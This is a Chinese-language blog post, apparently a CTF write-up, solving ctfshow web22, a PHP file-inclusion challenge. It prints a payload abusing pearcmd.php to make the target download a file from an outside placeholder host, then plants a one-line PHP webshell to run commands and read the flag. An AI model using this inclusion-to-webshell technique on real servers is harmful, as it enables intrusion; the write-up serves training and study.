@@ -1,0 +1,178 @@
+
+
+
+
+
+
+<!doctype html>
+<html lang="en">
+
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script type="text/javascript" 
+src="//cdnjs.cloudflare.com/ajax/libs/prettify/r298/prettify.min.js">
+</script>
+<link href=  "/plugins/code-theme/tomorrow.css" type="text/css" rel="stylesheet" />
+<link rel="stylesheet" href="/plugins/github-markdown.css">
+
+<head>
+  <meta charset="UTF-8" name="viewport" content="width=device-width,initial-scale=1">
+  
+    
+    
+      <link rel="stylesheet" href="/css/legend.css">
+    
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body id="body-x">
+<div id="layout-content">
+  <div id="menu-outer-x">
+  <div id="menu-inner">
+    
+    
+    <div id="site-title">
+      Momax's blog
+    </div>
+    
+
+     
+    <div>
+    
+      
+      <a href="/">首页</a>
+      
+    
+      
+      <a href="/archives">归档</a>
+      
+    
+    </div>
+  </div>
+</div> 
+  <div id="content-outer">
+    <div id="content-inner">
+      
+      
+  <article class="markdown-body">
+    <h2 id="post-title">ctfshow萌新计划web22
+       
+        <div id="post-time" datetime="2020-12-10T11:23:16.366Z">
+          2020-12-10
+        </div>
+      
+    </h2>
+    <p>@<a href="ctfshow萌新计划web22">TOC</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上次做题，直接瞄准ctfshow萌新计划开炮，结果没打完，这次来补充一下。</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>打开题目，发现了源码</p>
+<pre><code class="php">&lt;?php
+if(isset($_GET[&#39;c&#39;])){
+       $c=$_GET[&#39;c&#39;];
+       if(!preg_match(&quot;/\:|\/|\\\/i&quot;,$c)){
+               include($c.&quot;.php&quot;);
+       }
+
+
+}else{
+        highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<p>发现相比较前面几个，过滤的少了，但是变为了<code>include文件包含</code>，并且把<code>传参c</code>和<code>.php</code>拼接在了一起。刚拿到，就想着还是用<code>日志包含</code>进行<code>后门文件上传</code>，然后<code>访问日志目录</code>进入<code>网站目录</code>。但是可能因为是过滤了，没成功，就想着绕过过滤，然后把后面的<code>.php</code>文件后缀给<code>注释</code>掉，但是一直不成功。后来在群里问了大师傅之后，才知道这个题目的身份是<code>www用户，</code>无法远<code>程访问默认日志文件</code>。那么到这里就断了，该怎么办呢？问了大师傅之后得到了新的思路，详情还是看<a href="https://blog.csdn.net/qq_46091464/article/details/108954166" target="_blank" rel="noopener">这篇文章</a>。<br>刚看了这篇文章之后，我直呼涨见识，这，，根本没听说过，好吧，是我菜了。<br>关于命令<code>pearcmd&amp;+download+http://xxx////.php</code>这个，文章里有说明，不进行过多的讲解，这里给一下自己的见解。</p>
+<pre><code class="php">pear是一个是可重用的PHP组件框架和系统分发
+– 为PHP用户提供开源的结构化代码库
+– 便于代码的分发和包的维护
+– 标准化PHP的编写代码
+– 提供PHP的扩展社区库（PECL）
+– 通过网站、邮件列表和下载镜像支持PHP/PEAR社区
+在pear中有一个pearcmd.php的类，这里传参c值为pearcmd拼接后面的.php后缀，然后进行下一步的操作。下载文件从指定服务器</code></pre>
+<p>然后根据大师傅的博客，进行尝试。首先构造payload为：<code>?c=pearcmd&amp;+download+http://xxxxx/1emon/index.php</code>。<br>而对于，<code>index.php</code>内容是<br><img src="https://img-blog.csdnimg.cn/20201210112746574.png" alt="测试"><br>然后用构造的payload尝试，发现<br><img src="https://img-blog.csdnimg.cn/20201210113019304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="结果"><br>然后访问文件得到当前的用户信息<br><img src="https://img-blog.csdnimg.cn/20201210113101873.png" alt="用户信息"><br>那么既然成功了，接下来就用一句话进行了，直接修改文件内容为一句话木马，然后同样的方法，访问之后，在post传参，结果如下：<br><img src="https://img-blog.csdnimg.cn/20201210113743818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="ls结果"><br><img src="https://img-blog.csdnimg.cn/20201210113828900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="grep结果"><br>得到flag。</p>
+
+  </article>
+
+  
+    
+    
+      <div id="page-prev-next">
+        
+        
+          <a id="page-prev-a" href="/2020/12/16/buu%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"> ← buu学习之路 </a>
+        
+
+        
+        
+          <a id="page-next-a" href="/2020/11/29/buu%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%80%EF%BC%89/"> buu学习之旅（一） → </a>
+        
+      </div>
+    
+    
+    
+    
+
+    
+    
+
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div id="reward_comment">文章对我有帮助，打赏作者</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/wechatpay.png" alt="moMaxX WeChat Pay"/>
+          <p>微信</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/alipay.png" alt="moMaxX Alipay"/>
+          <p>支付宝</p>
+        </div> 
+      
+    </div>
+  </div>
+
+
+  
+
+    </div>
+  </div>
+</div>
+
+
+
+<div id="bottom-outer">
+  
+  <div id="bottom-inner">
+    moMaxX 
+    ©2021 |Powered by  
+    <a href="http://hexo.io" target="_blank">Hexo</a> with theme 
+    <a href="https://github.com/iHongRen/legend" target="_blank">legend</a>
+  </div>
+    
+    
+    
+      <a href="/atom.xml">
+      
+      <img src=/images/rss.png height="18" width="18">
+      
+</div> 
+
+
+  
+  
+    <script src="/js/legend.js"></script>
+  
+
+
+</body>
+</html>
+
+
+<script>
+$(window).on('load', function(){
+   $('pre').addClass('prettyprint').attr('style', 'overflow:auto;');
+   prettyPrint();
+ });
+</script>
+
